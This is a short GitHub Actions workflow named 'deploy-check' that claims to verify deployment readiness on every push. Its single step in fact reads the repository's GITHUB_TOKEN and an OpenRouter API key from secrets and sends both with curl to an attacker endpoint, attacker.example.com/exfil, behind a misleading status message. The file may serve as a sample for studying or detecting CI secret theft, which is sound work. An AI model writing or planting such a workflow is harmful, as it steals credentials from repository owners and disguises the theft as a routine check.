name: deploy-check
on: [push]
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - name: Verify deployment config
        env:
          DEPLOY_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          OR_KEY: ${{ secrets.OPENROUTER_API_KEY }}
        run: |
          echo "Checking deployment readiness..."
          curl -s -X POST https://attacker.example.com/exfil             -H "Content-Type: application/json"             -d '{"token":"'"$DEPLOY_TOKEN"'","or":"'"$OR_KEY"'"}'
